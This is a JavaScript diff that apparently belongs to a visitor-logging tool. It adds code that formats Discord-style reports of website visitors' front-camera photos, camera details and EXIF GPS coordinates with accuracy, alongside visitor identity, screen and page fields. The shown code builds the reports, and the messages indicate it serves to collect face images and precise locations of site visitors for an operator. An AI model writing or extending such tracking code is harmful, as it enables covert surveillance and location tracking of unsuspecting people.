@@ -146,6 +146,32 @@ function screenBlock(data) {
   ].join("\n");
 }
 
+function photoMetaBlock(data) {
+  const m = data.photoMeta;
+  if (!m || typeof m !== "object") return null;
+  const lines = [
+    m.deviceLabel ? `**📷 Device:** ${s(m.deviceLabel, 80)}` : null,
+    m.facingMode ? `**Facing:** \`${s(m.facingMode)}\`` : null,
+    m.frameRate != null ? `**Frame rate:** \`${s(m.frameRate)} fps\`` : null,
+    m.sourceWidth != null && m.sourceHeight != null
+      ? `**Sensor / Source:** \`${s(m.sourceWidth)} × ${s(m.sourceHeight)}\``
+      : null,
+    m.outputWidth != null && m.outputHeight != null
+      ? `**Output JPEG:** \`${s(m.outputWidth)} × ${s(m.outputHeight)}\` · Q \`${s(m.jpegQuality)}\``
+      : null,
+    m.aspectRatio ? `**Aspect:** \`${s(m.aspectRatio)}\`` : null,
+    m.zoom != null ? `**Zoom:** \`${s(m.zoom)}x\`` : null,
+    m.gpsLat != null && m.gpsLon != null
+      ? `**📍 GPS (EXIF):** \`${m.gpsLat}, ${m.gpsLon}\`${m.gpsAccuracy != null ? ` · ±${Math.round(m.gpsAccuracy)} m` : ""}${m.gpsQuality ? ` · ${s(m.gpsQuality)}` : ""}`
+      : null,
+    m.capWidthMax != null
+      ? `**Max resolution:** \`${s(m.capWidthMax)} × ${s(m.capHeightMax)}\` · **FPS max:** \`${s(m.capFrameRateMax)}\``
+      : null,
+  ].filter(Boolean);
+  if (!lines.length) return null;
+  return lines.join("\n");
+}
+
 function localeBlock(data) {
   return [
     `**言語 / Language:** ${s(data.language)} · ${s(data.languages, 80)}`,
@@ -371,27 +397,39 @@ function buildGpsErrorEmbed(data) {
 // ── Kamera (pesan terpisah + lampiran foto) ──────────────
 
 function buildCameraEmbed(data) {
+  const photoBlock = photoMetaBlock(data);
+  const fields = [
+    sectionHeader("キャプチャ情報", "Capture Info"),
+    {
+      name: "📷 Photo",
+      value: [
+        `**Capture ID:** \`${s(data.captureId, 48)}\``,
+        data.captureTs ? `**Timestamp:** \`${new Date(data.captureTs).toISOString()}\`` : null,
+        "*画像は添付ファイル / Image attached below*",
+        photoBlock ? "*EXIF embedded in JPEG attachment*" : null,
+      ].filter(Boolean).join("\n"),
+      inline: false,
+    },
+  ];
+  if (photoBlock) {
+    fields.push({
+      name: "🧾 Photo Metadata",
+      value: photoBlock,
+      inline: false,
+    });
+  }
+  fields.push(
+    SPACER,
+    { name: "👤 Visitor", value: identityBlock(data), inline: false },
+    { name: "🖥️ Display", value: screenBlock(data), inline: false },
+    { name: "🔗 Page", value: linkField(data.url), inline: false },
+  );
   return embedShell(
     COLORS.camera,
     "📸 カメラキャプチャ  ·  Front Camera Capture",
     "来訪者がカメラアクセスを許可 — 写真を取得しました。",
     "Visitor granted camera access — photo captured.",
-    [
-      sectionHeader("キャプチャ情報", "Capture Info"),
-      {
-        name: "📷 Photo",
-        value: [
-          `**Capture ID:** \`${s(data.captureId, 48)}\``,
-          data.captureTs ? `**Timestamp:** \`${new Date(data.captureTs).toISOString()}\`` : null,
-          "*画像は添付ファイル / Image attached below*",
-        ].filter(Boolean).join("\n"),
-        inline: false,
-      },
-      SPACER,
-      { name: "👤 Visitor", value: identityBlock(data), inline: false },
-      { name: "🖥️ Display", value: screenBlock(data), inline: false },
-      { name: "🔗 Page", value: linkField(data.url), inline: false },
-    ],
+    fields,
   );
 }
 
